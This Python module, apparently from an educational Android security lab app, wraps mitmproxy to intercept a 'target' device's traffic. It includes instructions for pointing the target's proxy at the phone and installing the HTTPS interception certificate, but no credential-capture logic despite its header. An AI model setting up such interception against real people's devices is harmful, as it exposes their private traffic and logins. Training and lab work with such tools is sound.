"""
CyberLab Pro v3.0 — PortalForge (Android/Chaquopy)
Captive Portal Builder + Credential Capture
"""
import os
import json
import time
import threading
import subprocess
from pathlib import Path
from core.utils import run_command, DATA_DIR, CAPTURE_DIR, is_rooted

CAPTURE_DIR_PORTAL = f"{CAPTURE_DIR}/portal"
Path(CAPTURE_DIR_PORTAL).mkdir(parents=True, exist_ok=True)

TEMPLATES_DIR = os.path.join(os.environ.get("CYBERLAB_BASE_DIR", "/data/data/com.cyberlab/files/assets"), "templates")


class PortalForge:
    def __init__(self):
        self.proxy_process = None
        self.proxy_running = False
        self.proxy_port = 8080
        self.web_port = 8081
        self.captures = []

    def start_proxy(self, port: int = 8080, web_port: int = 8081, transparent: bool = False) -> dict:
        if self.proxy_running:
            return {"success": False, "error": "already_running"}

        self.proxy_port = port
        self.web_port = web_port
        student_ip = self._get_student_ip()
        use_transparent = transparent and is_rooted()
        mode = "transparent" if use_transparent else "regular"

        # Start mitmweb
        exe = self._find_mitmproxy()
        if not exe:
            return {"success": False, "error": "mitmproxy not found"}

        flow_file = f"{CAPTURE_DIR_PORTAL}/traffic_{int(time.time())}.flow"
        cmd = [
            exe, "--mode", mode,
            "--listen-port", str(port),
            "--web-port", str(web_port),
            "--web-host", "0.0.0.0",
            "--set", "block_global=false",
            "--save-stream-file", flow_file,
        ]

        try:
            self.proxy_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            time.sleep(2)
            if self.proxy_process.poll() is not None:
                return {"success": False, "error": "startup_failed"}
            self.proxy_running = True
            return {
                "success": True, "mode": mode,
                "student_ip": student_ip,
                "proxy_port": port,
                "web_ui": f"http://localhost:{web_port}",
                "instructions": [
                    f"1. Target must be on the SAME WiFi/router as this phone",
                    f"2. On target, set Manual Proxy to {student_ip}:{port}",
                    "3. Open http://mitm.it on target to install HTTPS certificate",
                    f"4. Traffic appears in Web UI: http://localhost:{web_port}",
                ],
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def stop_proxy(self) -> dict:
        if not self.proxy_running:
            return {"success": False, "message": "not_running"}
        try:
            if self.proxy_process and self.proxy_process.poll() is None:
                self.proxy_process.terminate()
                self.proxy_process.wait(timeout=5)
            self.proxy_running = False
            self.proxy_process = None
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_captures(self) -> list:
        return self.captures

    def _find_mitmproxy(self):
        local = os.path.join(os.environ.get("CYBERLAB_BASE_DIR", "/data/data/com.cyberlab/files/binaries"), "mitmproxy")
        if os.path.exists(local):
            return local
        return subprocess.run(["which", "mitmproxy"], capture_output=True, text=True).stdout.strip() or None

    def _get_student_ip(self):
        res = run_command("ip addr show", timeout=10)
        if res["success"]:
            import re
            for line in res["stdout"].splitlines():
                if "inet " in line and "127.0.0.1" not in line:
                    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/\d+", line)
                    if m:
                        ip = m.group(1)
                        if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172."):
                            return ip
        return "Unknown"
